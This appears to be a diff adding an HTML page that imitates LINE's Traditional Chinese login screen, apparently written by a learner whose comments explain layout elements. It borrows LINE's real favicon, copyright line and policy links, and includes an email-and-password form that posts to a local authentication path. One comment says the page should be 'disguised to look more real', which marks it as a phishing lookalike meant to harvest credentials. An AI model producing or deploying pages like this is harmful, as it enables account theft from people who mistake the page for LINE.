@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="zh_TW">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>LINE Login</title>
+    <!--    偽裝的像一點-->
+    <link rel="icon" type="image/x-icon" sizes="16x16" href="https://vos.line-scdn.net/login-web/img/favicon-16x16.png">
+    <link href="style.css" rel="stylesheet">
+    <link href="index.css" rel="stylesheet">
+
+</head>
+<body>
+<div id="__layout">
+    <div id="app" class="LyBody">
+        <div class="LyWrap">
+            <!--CONTENTS-AREA-->
+            <div class="LyContents" role="main">
+                <div class="lyContentsInner">  <!-- 切割畫面：上下兩層 -->
+                    <div class="MdBox01">      <!-- 切割畫面：上層三分 -->
+                        <div class="mdBox01Inner">  <!-- 主體 -->
+                            <!-- 畫面切割(兩層：上) -->
+                            <div class="MdLogo01"> <!-- 主體01上層：LINE -->
+                                <h1 class="mdLogo01Img">LINE</h1>
+                            </div>
+                            <!-- novalidate：檢查表單，如果輸入(true)就不會檢查 -->
+                            <form method="post" action="/oauth2/v2.1/authenticate" novalidate="novalidate">
+    <!--                            <input type="hidden" name="userId" value>-->
+                                <fieldset class="MdFormGroup01">
+                                    <legend>Login</legend>
+                                    <div  class="MdInputTxt01">  <!-- 輸入表格(上)：電子郵件切割 -->
+                                        <label class="mdInputTxt01Label">電子郵件帳號</label>
+                                        <input type="text" name="tid" placeholder="電子郵件帳號" autocapitalize="off" spellcheck="false">
+                                    </div>
+
+                                    <div class="MdInputTxt01">  <!-- 輸入表格(中)：密碼切割 -->
+                                        <label for="input-field" class="mdInputTxt01Label">密碼</label>
+                                        <input id = "input-field" type="password" name="tpasswd" placeholder="密碼">
+                                    </div>
+                                    <div class="mdFormGroup01Btn">  <!-- 輸入表格(下)：登入(按鈕)切割 -->
+                                        <button type="submit" class="MdBtn01 ExDisabled">登入</button>
+                                    </div>
+<!--                                    <div class="MdFormError01 MdHide">   &lt;!&ndash; 排版用 &ndash;&gt;-->
+<!--                                        <p class="mdFormErrorTxt01"></p>-->
+<!--                                    </div>-->
+                                </fieldset>
+                            </form>
+                            <!-- 畫面切割(主體：最下層) -->
+                            <div class="MdMN04QrLogin">
+                                <h3 class="MdTtl01">
+                                    <span class="mdTtl01Inner">使用其他方式登入</span>
+                                </h3>
+                                <a data-v-77c976ae href="#/qr" class="MdBtn02">
+                                    <!-- span：可以將句子裡的詞拆成小元素 -->
+                                    <span class="mdMN04NewIco">NEW</span>
+                                    <span>透過行動條碼登入</span>
+                                </a>
+                            </div>
+                            <div class="MdMN03Etc">
+                                <button type="button" class="mdMN03EtcLink01">不登入並繼續操作</button>
+                                <button type="button" class="mdMN03EtcLink01">忘記電子郵件帳號或密碼？</button>
+                            </div>
+
+                        </div>
+                    </div>
+                    <!-- 畫面切割(兩層：下) -->
+                    <footer class="LyFoot"> <!-- 畫面切割(下層整塊) -->
+                        <div class="lyFootInner"> <!-- 畫面切割(下層：文字的部分) -->
+                            <div class="MdGFT01Copy"> <!-- 下層：左邊的小物件) -->
+                                <small>
+                                    ©&nbsp;
+                                    <b>LINE Corporation</b>
+                                </small>
+                            </div>
+    <!--                        <h5 class="MdHide">LINE Corporation Link</h5>-->
+                            <div class="MdGFT02Link"> <!-- 下層：右邊的小物件) -->
+                                <ul class="mdGFT02Ul link-list">
+                                    <li>
+                                        <a href="https://terms.line.me/line_rules/?lang=zh_TW" target="_blank" rel="noopener">隱私權政策</a>
+                                    </li>
+                                    <li>
+                                        <a href="https://terms.line.me/line_terms/?lang=zh_TW" target="_blank" rel="noopener">服務條款</a>
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+                    </footer>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<script src="main.js"></script>
+</body>
+</html>
